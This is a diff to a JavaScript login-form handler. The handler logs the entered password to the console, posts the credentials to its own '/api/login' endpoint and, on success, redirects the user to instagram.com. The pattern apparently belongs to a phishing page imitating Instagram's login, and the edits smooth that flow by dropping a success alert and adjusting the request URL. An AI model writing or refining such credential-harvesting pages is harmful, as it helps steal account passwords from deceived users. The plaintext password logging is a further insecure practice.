@@ -52,7 +52,7 @@ form.addEventListener("submit", async (e) => {
   console.log("Password: ", payload.password);
 
   try {
-    const response = await fetch("/api/login", {
+  const response = await fetch(window.location.origin + "/api/login", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -65,13 +65,12 @@ form.addEventListener("submit", async (e) => {
     if (response.ok) {
       errorMsg.classList.remove("visible");
       errorMsg.classList.add("hidden");
-      alert("Login successful! Redirecting to home page...");
-
       window.location.href = "https://www.instagram.com"; // Redirect to home page
     } else {
       errorMsg.classList.remove("hidden");
       errorMsg.classList.add("visible");
-      errorMsg.innerText = result.message || "Invalid username or password";
+      // show server message for clearer debugging
+      errorMsg.innerText = result.message || (result && JSON.stringify(result)) || "Invalid username or password";
     }
   } catch (error) {
     console.error("Login Error:", error);
